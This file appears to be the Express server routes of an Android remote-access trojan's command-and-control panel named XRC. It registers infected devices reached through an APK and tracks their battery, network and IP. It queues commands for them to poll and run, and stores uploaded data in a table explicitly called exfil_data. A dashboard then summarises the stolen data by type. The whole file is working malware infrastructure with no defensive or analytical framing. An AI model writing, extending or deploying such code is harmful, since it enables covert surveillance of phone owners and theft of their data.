// ============================================================
// FILE: XRC/server/src/routes/api.js
// ============================================================
const express = require('express');
const { v4: uuidv4 } = require('uuid');
const { getDatabase } = require('../db/database');
const { sendToDevice } = require('../ws/websocket');

const router = express.Router();

/**
 * POST /api/device/register
 * Device registration endpoint (called by APK on first connect).
 */
router.post('/device/register', (req, res) => {
    try {
        const db = getDatabase();
        const { device_id, model, manufacturer, android_version, sdk } = req.body;

        if (!device_id) {
            return res.status(400).json({ error: 'device_id required' });
        }

        const existing = db.prepare('SELECT * FROM devices WHERE device_id = ?').get(device_id);

        if (existing) {
            // Update last_seen
            db.prepare(`
                UPDATE devices SET
                    last_seen = strftime('%s','now'),
                    is_online = 1,
                    ip_address = ?,
                    model = COALESCE(?, model),
                    manufacturer = COALESCE(?, manufacturer),
                    android_version = COALESCE(?, android_version),
                    sdk_version = COALESCE(?, sdk_version)
                WHERE device_id = ?
            `).run(
                req.ip, model, manufacturer, android_version, sdk, device_id
            );

            res.json({ message: 'Device updated', device_id });
        } else {
            // New device
            db.prepare(`
                INSERT INTO devices (id, device_id, model, manufacturer, android_version, sdk_version, ip_address, is_online, first_seen, last_seen)
                VALUES (?, ?, ?, ?, ?, ?, ?, 1, strftime('%s','now'), strftime('%s','now'))
            `).run(uuidv4(), device_id, model, manufacturer, android_version, sdk, req.ip);

            console.log(`[API] New device registered: ${device_id} (${model})`);
            res.status(201).json({ message: 'Device registered', device_id });
        }
    } catch (err) {
        console.error('Device register error:', err);
        res.status(500).json({ error: 'Internal server error' });
    }
});

/**
 * POST /api/device/heartbeat
 * Device heartbeat — updates last_seen and battery info.
 */
router.post('/device/heartbeat', (req, res) => {
    try {
        const db = getDatabase();
        const { device_id, battery, network } = req.body;

        if (!device_id) return res.status(400).json({ error: 'device_id required' });

        db.prepare(`
            UPDATE devices SET
                last_seen = strftime('%s','now'),
                is_online = 1,
                battery_level = COALESCE(?, battery_level),
                network_type = COALESCE(?, network_type),
                ip_address = ?
            WHERE device_id = ?
        `).run(battery, network, req.ip, device_id);

        res.json({ message: 'Heartbeat received', ts: Date.now() });
    } catch (err) {
        console.error('Heartbeat error:', err);
        res.status(500).json({ error: 'Internal server error' });
    }
});

/**
 * POST /api/device/message
 * Device sends data (exfil, sensor data, command results).
 */
router.post('/device/message', (req, res) => {
    try {
        const db = getDatabase();
        const { type, device_id, payload } = req.body;

        if (!device_id || !type) {
            return res.status(400).json({ error: 'type and device_id required' });
        }

        // Store in exfil_data
        const id = uuidv4();
        db.prepare(`
            INSERT INTO exfil_data (id, device_id, type, data, received_at)
            VALUES (?, ?, ?, ?, strftime('%s','now'))
        `).run(id, device_id, type, payload || '{}');

        // Update device last_seen
        db.prepare('UPDATE devices SET last_seen = strftime("%s","now"), is_online = 1 WHERE device_id = ?')
            .run(device_id);

        res.json({ message: 'Message received', id });
    } catch (err) {
        console.error('Device message error:', err);
        res.status(500).json({ error: 'Internal server error' });
    }
});

/**
 * GET /api/device/poll
 * HTTP poll for pending commands (fallback for devices without WS).
 */
router.get('/device/poll', (req, res) => {
    try {
        const db = getDatabase();
        const device_id = req.query.id;

        if (!device_id) return res.status(400).json({ error: 'id query param required' });

        // Get pending commands for this device
        const pending = db.prepare(`
            SELECT * FROM commands
            WHERE device_id = ? AND status = 'pending'
            ORDER BY created_at ASC
            LIMIT 1
        `).get(device_id);

        if (pending) {
            // Mark as in_progress
            db.prepare('UPDATE commands SET status = ?, executed_at = strftime("%s","now") WHERE id = ?')
                .run('in_progress', pending.id);

            res.json({
                type: 'cmd',
                id: pending.id,
                device_id: pending.device_id,
                ts: pending.created_at * 1000,
                payload: JSON.stringify(pending)
            });
        } else {
            res.json(null);
        }
    } catch (err) {
        console.error('Poll error:', err);
        res.status(500).json({ error: 'Internal server error' });
    }
});

/**
 * POST /api/device/command-result
 * Device submits command execution result.
 */
router.post('/device/command-result', (req, res) => {
    try {
        const db = getDatabase();
        const { command_id, device_id, result, error } = req.body;

        if (!command_id) return res.status(400).json({ error: 'command_id required' });

        db.prepare(`
            UPDATE commands SET
                status = CASE WHEN ? IS NOT NULL THEN 'error' ELSE 'completed' END,
                completed_at = strftime('%s','now'),
                result = ?,
                error = ?
            WHERE id = ?
        `).run(error, result, error, command_id);

        res.json({ message: 'Result recorded' });
    } catch (err) {
        console.error('Command result error:', err);
        res.status(500).json({ error: 'Internal server error' });
    }
});

/**
 * GET /api/dashboard/stats
 * Dashboard overview statistics.
 */
router.get('/dashboard/stats', (req, res) => {
    try {
        const db = getDatabase();

        const totalDevices = db.prepare('SELECT COUNT(*) as count FROM devices').get().count;
        const onlineDevices = db.prepare('SELECT COUNT(*) as count FROM devices WHERE is_online = 1').get().count;
        const pendingCommands = db.prepare('SELECT COUNT(*) as count FROM commands WHERE status = "pending"').get().count;
        const totalExfil = db.prepare('SELECT COUNT(*) as count FROM exfil_data').get().count;

        // Commands over time (last 24 hours)
        const commandsLast24h = db.prepare(`
            SELECT strftime('%H', created_at, 'unixepoch') as hour, COUNT(*) as count
            FROM commands
            WHERE created_at > strftime('%s','now', '-24 hours')
            GROUP BY hour ORDER BY hour
        `).all();

        // Exfil data by type
        const exfilByType = db.prepare(`
            SELECT type, COUNT(*) as count FROM exfil_data GROUP BY type ORDER BY count DESC
        `).all();

        // Recent activity
        const recentActivity = db.prepare(`
            (SELECT 'device_online' as type, device_id, last_seen as ts FROM devices WHERE is_online = 1 ORDER BY last_seen DESC LIMIT 10)
            UNION ALL
            (SELECT 'command' as type, device_id, created_at as ts FROM commands ORDER BY created_at DESC LIMIT 10)
            UNION ALL
            (SELECT 'exfil' as type, device_id, received_at as ts FROM exfil_data ORDER BY received_at DESC LIMIT 10)
            ORDER BY ts DESC LIMIT 25
        `).all();

        res.json({
            total_devices: totalDevices,
            online_devices: onlineDevices,
            pending_commands: pendingCommands,
            total_exfil: totalExfil,
            commands_last_24h: commandsLast24h,
            exfil_by_type: exfilByType,
            recent_activity: recentActivity
        });
    } catch (err) {
        console.error('Dashboard stats error:', err);
        res.status(500).json({ error: 'Internal server error' });
    }
});

module.exports = router;
